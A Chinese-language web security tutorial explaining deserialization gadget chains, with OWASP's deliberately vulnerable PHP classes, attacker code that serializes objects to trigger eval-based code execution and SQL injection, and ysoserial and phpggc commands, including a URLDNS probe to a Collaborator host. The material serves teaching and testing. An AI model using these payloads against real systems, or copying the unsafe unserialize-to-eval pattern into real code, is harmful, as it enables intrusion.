## Gadget 链

“Gadget”是应用程序中现有的一段代码，可以帮助攻击者实现特定目标。单个 gadget 可能不会直接对用户输入造成危害。但是，攻击者的目标可能只是调用一个方法，将他们的输入传递给另一个 gadget。通过以这种方式将多个 gadget 链接在一起，攻击者可以潜在地将其输入传递到危险的“sink gadget”中，从而造成最大损害。

与其他类型的漏洞利用不同，gadget 链不是攻击者构建的链接方法的载荷。所有代码都已存在于网站上。攻击者唯一控制的是传递给 gadget 链的**数据**。这通常通过反序列化期间调用的魔术方法（有时称为“kick-off gadget”）来完成。

在实际中，许多不安全的反序列化漏洞只能通过使用 gadget 链来利用。有时这可能是一个简单的一步或两步链，但构建高严重性攻击可能需要更复杂的对象实例化和方法调用序列。因此，能够构建 gadget 链是成功利用不安全反序列化的关键方面之一。

### 工具链示例

工具链使用魔术方法作为其初始小工具。攻击者然后可以使用这些方法来调用其他小工具。

考虑以下示例应用程序代码，取自 https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection：

```php
class Example
{
    ① private $obj;
    function __construct()
    {
        // some PHP code...
    }
    function __wakeup()
    {
        ② if (isset($this->obj)) return $this->obj->evaluate();
    }
}
class CodeSnippet
{
    ③ private $code;
    ④ function evaluate()
    {
        eval($this->code);
    }
}
// some PHP code...
⑤ $user_data = unserialize($_POST['data']);
// some PHP code...
```

在此应用程序中，代码定义了两个类：`Example`和`CodeSnippet`。`Example`有一个名为`obj`的属性①，当反序列化`Example`对象时，会调用其`__wakeup()`函数，该函数调用`obj`的`evaluate()`方法②。`CodeSnippet`类有一个名为`code`的属性，包含要执行的代码字符串③，以及一个`evaluate()`方法④，它对`code`字符串调用`eval()`。

在代码的另一部分，程序接受来自用户的POST参数`data`并对其调用`unserialize()`⑤。

由于最后一行包含不安全的反序列化漏洞，攻击者可以使用以下代码生成序列化对象：

```php
class CodeSnippet
{
    private $code = "phpinfo();";
}
class Example
{
    private $obj;
    function __construct()
    {
        $this->obj = new CodeSnippet;
    }
}
print urlencode(serialize(new Example));
```

此代码片段定义了一个名为`CodeSnippet`的类，并将其`code`属性设置为`phpinfo();`。然后它定义了一个名为`Example`的类，并在实例化时将其`obj`属性设置为一个新的`CodeSnippet`实例。最后，它创建一个`Example`实例，序列化它，并对序列化字符串进行URL编码。攻击者然后可以将生成的字符串输入POST参数`data`。

请注意，攻击者的序列化对象使用了应用程序源代码中其他位置找到的类和属性名称。因此，当程序收到精心构造的`data`字符串时，将执行以下操作：

首先，它将反序列化对象并创建一个`Example`实例。然后，由于`Example`实现了`__wakeup()`，程序将调用`__wakeup()`并看到`obj`属性被设置为一个`CodeSnippet`实例。最后，它将调用`obj`的`evaluate()`方法，由于攻击者将`code`属性设置为`phpinfo();`，该方法运行`eval("phpinfo();")`。攻击者能够执行他们选择的任何PHP代码。

POP链通过链式重用应用程序代码库中的代码来实现RCE。让我们看另一个如何使用POP链实现SQL注入的示例。此示例也取自https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection。

假设应用程序在代码中某处定义了一个名为`Example3`的类，并反序列化来自POST参数`data`的未清理用户输入：

```php
class Example3
{
    protected $obj;
    function __construct()
    {
        // some PHP code...
    }
    ① function __toString()
    {
        if (isset($this->obj)) return $this->obj->getValue();
    }
}
// some PHP code...
$user_data = unserialize($_POST['data']);
// some PHP code...
```

注意`Example3`实现了`__toString()`魔术方法①。在这种情况下，当`Example3`实例被视为字符串时，它将返回对其`$obj`属性运行`getValue()`方法的结果。

同时假设，在应用程序的某处，代码定义了类`SQL_Row_Value`。它有一个名为`getValue()`的方法，执行SQL查询。该SQL查询从`SQL_Row_Value`实例的`$_table`属性获取输入：

```php
class SQL_Row_Value
{
    private $_table;
    // some PHP code...
    function getValue($id)
    {
        $sql = "SELECT * FROM {$this->_table} WHERE id = " . (int)$id;
        $result = mysql_query($sql, $DBFactory::getConnection());
        $row = mysql_fetch_assoc($result);
        return $row['value'];
    }
}
```

攻击者可以通过控制`Example3`中的`$obj`来实现SQL注入。以下代码将创建一个`Example3`实例，其`$obj`设置为`SQL_Row_Value`实例，`$_table`设置为字符串`"SQL Injection"`：

```php
class SQL_Row_Value
{
    private $_table = "SQL Injection";
}
class Example3
{
    protected $obj;
    function __construct()
    {
        $this->obj = new SQL_Row_Value;
    }
}
print urlencode(serialize(new Example3));
```

结果，每当攻击者的`Example3`实例被视为字符串时，其`$obj`的`get_Value()`方法将被执行。这意味着`SQL_Row_Value`的`get_Value()`方法将以`$_table`字符串设置为`"SQL Injection"`执行。

攻击者实现了有限的SQL注入，因为他们可以控制传递给SQL查询`SELECT * FROM {$this->_table} WHERE id = " . (int)$id;`的字符串。

### 使用预构建的 Gadget 链

手动识别 gadget 链可能是一个相当费力的过程，如果没有源代码访问权限几乎不可能。幸运的是，有几种选项可以使用预构建的 gadget 链，您可以先尝试。

有几种工具可用，提供一系列在其他网站上成功利用的预发现链。即使您没有源代码访问权限，您也可以使用这些工具以相对较少的工作量来识别和利用不安全的反序列化漏洞。这种方法之所以可行，是因为广泛使用包含可被利用的 gadget 链的库。例如，如果 Java 的 Apache Commons Collections 库中的 gadget 链可以在一个网站上被利用，那么实现此库的任何其他网站也可能可以使用相同的链进行利用。

#### Java ysoserial

用于 Java 反序列化的此类工具之一是 [ysoserial](https://github.com/frohoff/ysoserial)。它允许您为认为目标应用程序正在使用的库选择一个提供的 gadget 链，然后传入要执行的命令。然后，它会基于所选链创建一个适当的序列化对象。这仍然涉及一定的试错，但比手动构建自己的 gadget 链要少得多。

**注意：** 在 Java 16 及更高版本中，您需要为 Java 设置一系列命令行参数（访问非公共字段）才能运行 ysoserial。例如：
```sh
java -jar ysoserial-all.jar \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens=java.base/java.net=ALL-UNNAMED \
   --add-opens=java.base/java.util=ALL-UNNAMED \
   [payload] '[command]'
```
- `payload` 当前使用的工具链
- `command` 最终执行的命令

并非 ysoserial 中的所有 gadget 链都允许您运行任意代码。相反，它们可能用于其他目的。例如，您可以使用以下链来帮助您快速检测几乎任何服务器上的不安全反序列化：

- `URLDNS` 链触发对提供的 URL 的 DNS 查找。最重要的是，它不依赖目标应用程序使用特定的易受攻击库，并且在任何已知的 Java 版本中都能工作。这使其成为用于检测目的的最通用 gadget 链。如果您在流量中发现序列化对象，可以尝试使用此 gadget 链生成一个对象，触发与 Burp Collaborator 服务器的 DNS 交互。如果成功，您可以确定您的目标上发生了反序列化。

    ```sh
    java \
        --add-opens=java.base/java.net=ALL-UNNAMED \
        -jar ysoserial-all.jar URLDNS 'https://id.oastify.com' | base64 -w 0
    ```

- `JRMPClient` 是另一个可用于初始检测的通用链。它导致服务器尝试与提供的 IP 地址建立 TCP 连接。请注意，您需要提供原始 IP 地址而不是主机名。当所有出站流量（包括 DNS 查找）都被防火墙阻止的环境中，此链可能很有用。您可以尝试使用两个不同的 IP 地址生成载荷：一个本地地址和一个被防火墙阻止的外部地址。如果应用程序对具有本地地址的载荷立即响应，但对具有外部地址的载荷挂起，导致响应延迟，这表明 gadget 链有效，因为服务器尝试连接到被阻止的地址。在这种情况下，响应中的细微时间差异可以帮助您检测服务器上是否发生反序列化，即使在盲情况下也是如此。

#### PHP Generic Gadget Chains

大多数经常遭受不安全反序列化漏洞的语言都有等效的概念验证工具。例如，对于基于 PHP 的网站，您可以使用 [PHP Generic Gadget Chains](https://github.com/ambionics/phpggc)
- 使用 `-l` 查看链列表，选择对应框架版本的载荷，注意载荷拥有特定命令类型（shell 命令、php 代码、函数调用）
- `-f,--fast-destruct` 参数确保序列化对象在 `unserialize()` 调用后立即销毁，而不是在脚本结束时销毁。使用在 `__destruct` 型向量中提高可靠性。


> **注意：** 重要的是要注意，漏洞是用户可控数据的反序列化，而不仅仅是网站代码或其任何库中存在 gadget 链。gadget 链只是在注入有害数据后操纵其流向的一种手段。这也适用于依赖不可信数据反序列化的各种内存损坏漏洞。换句话说，即使网站确实以某种方式堵塞了所有可能的 gadget 链，它可能仍然存在漏洞。

### 使用已记录的 Gadget 链

可能并不总是有专用工具可用于利用目标应用程序使用的框架中的已知 gadget 链。在这种情况下，值得在网上搜索是否有任何已记录的漏洞利用可以手动调整。调整代码可能需要一些对语言和框架的基本理解，有时您可能需要自行序列化对象，但这种方法仍然比从头构建漏洞利用要省力得多。

搜索 `特定编程语言 deserialization gadget chain`（反序列化 gadget chain）。

即使您找不到现成的 gadget 链，您仍然可以获得有助于创建自己的自定义漏洞利用的宝贵知识。
